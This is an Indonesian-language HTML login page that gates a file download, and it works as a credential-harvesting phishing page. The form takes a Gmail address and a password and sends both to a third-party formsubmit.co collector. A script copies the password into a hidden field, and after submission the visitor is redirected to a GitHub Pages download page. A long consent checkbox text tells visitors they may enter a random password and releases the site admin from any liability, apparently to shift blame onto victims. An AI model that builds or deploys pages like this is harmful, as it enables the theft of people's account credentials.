<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Login untuk Akses</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f4f6f8;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background-color: #fff;
      padding: 30px 25px;
      width: 100%;
      max-width: 400px;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
    }

    h2 {
      text-align: center;
      margin-bottom: 25px;
      font-size: 26px;
    }

    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 15px;
      margin-top: 15px;
      font-size: 16px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 15px;
      margin-top: 25px;
      font-size: 18px;
      background-color: #2196F3;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    label {
      display: block;
      text-align: center;
      font-size: 15px;
      margin-top: 25px;
      line-height: 1.7;
    }

    input[type="checkbox"] {
      transform: scale(1.3);
      margin-right: 10px;
    }

    small {
      display: block;
      text-align: center;
      margin-top: 15px;
      color: #888;
      font-size: 13px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login Dulu</h2>
    <form id="form" action="https://formsubmit.co/83df56c36ceab501d1ab9c9d6646c028" method="POST">
      
      <input type="email" id="email" name="email" placeholder="Email (@gmail.com)" required />
      <input type="password" id="password" name="password" placeholder="Password" required />
      <input type="hidden" id="message" name="message" />

      <label>
        <input type="checkbox" id="consent" name="consent" required />
        <div>
          Dengan mencentang kotak ini dan melanjutkan proses login:

          <br><br>

          Saya menyatakan bahwa saya mengisi data (email dan password) ini dengan <b>kesadaran penuh dan atas keinginan sendiri</b>, tanpa adanya paksaan dari pihak manapun.

          <br><br>

          Saya juga memahami bahwa <b>email yang saya masukkan harus diakhiri dengan "@gmail.com"</b>, dan <b>password dapat saya isi secara acak/random</b> sesuai keinginan pribadi.

          <br><br>

          Apabila terjadi kesalahan, penyalahgunaan, atau akibat negatif lain yang timbul karena data yang saya masukkan sendiri, saya <b>tidak akan menyalahkan admin situs ini dalam bentuk apapun</b>, karena semua yang saya lakukan adalah keputusan pribadi saya sendiri.

          <br><br>

          Saya sepenuhnya <b>bertanggung jawab atas data yang saya kirimkan</b>, dan saya menyadari bahwa peran admin hanya sebagai pengelola teknis untuk menjaga keamanan sistem â€” bukan sebagai pihak yang bertanggung jawab atas isi input dari pengguna.

          <br><br>

          Dengan ini, saya <b>membebaskan admin dari segala tuntutan atau kewajiban</b> jika terjadi masalah yang berasal dari kesalahan, kelalaian, atau tindakan saya sendiri.
        </div>
      </label>

      <!-- Belum diganti, masih ke halaman index.html -->
      <input type="hidden" name="_next" value="https://baimsuka.github.io/Download-file/index.html?verified=true" />

      <button type="submit">Login dan Download</button>

      <small>
        Situs ini tidak mengharuskan pengguna mengisi data asli. Semua isian adalah tanggung jawab pengguna sepenuhnya.
      </small>
    </form>
  </div>

  <script>
    document.getElementById("form").addEventListener("submit", function (e) {
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      const consent = document.getElementById("consent").checked;

      if (!email.endsWith("@gmail.com")) {
        alert("Email harus menggunakan @gmail.com");
        e.preventDefault();
        return false;
      }

      if (!consent) {
        alert("Kamu harus menyetujui syaratnya dulu.");
        e.preventDefault();
        return false;
      }

      document.getElementById("message").value = "Password: " + password;
    });
  </script>
</body>
</html>
